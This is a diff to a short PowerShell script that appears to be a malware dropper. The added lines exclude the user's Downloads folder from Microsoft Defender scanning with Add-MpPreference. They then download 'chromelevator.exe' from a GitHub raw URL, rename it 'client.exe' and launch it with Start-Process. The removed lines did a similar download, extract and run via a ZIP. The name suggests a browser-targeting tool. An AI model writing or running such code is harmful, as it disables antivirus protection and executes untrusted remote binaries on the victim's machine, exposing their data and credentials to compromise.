@@ -1,18 +1,12 @@
-# Paths
-$zipUrl  = "https://raw.githubusercontent.com/np4abdou1/testapi/refs/heads/main/s.zip"
-$zipFile = "$env:TEMP\s.zip"
-$extractDir = "$env:TEMP\s_extracted"
+Add-MpPreference -ExclusionPath $env:USERPROFILE\Downloads
+$url = 'https://raw.githubusercontent.com/np4abdou1/testapi/refs/heads/main/chromelevator.exe'
+$outputFile = [System.IO.Path]::Combine($env:USERPROFILE, 'Downloads', 'client.exe')
 
-# Make sure extract folder exists
-if (Test-Path $extractDir) { Remove-Item $extractDir -Recurse -Force }
-New-Item -ItemType Directory -Path $extractDir | Out-Null
+# Wait until the exclusion is confirmed (just a safeguard, usually it happens instantly)
+Start-Sleep -Milliseconds 100
 
-# Download ZIP
-Invoke-WebRequest -Uri $zipUrl -OutFile $zipFile
+# Download the file
+Invoke-WebRequest -Uri $url -OutFile $outputFile
 
-# Extract ZIP
-Expand-Archive -Path $zipFile -DestinationPath $extractDir -Force
-
-# Run chromelevator.exe
-$exe = Join-Path $extractDir "chromelevator.exe"
-Start-Process $exe
+# Run the downloaded file after the download is complete
+Start-Process -FilePath $outputFile
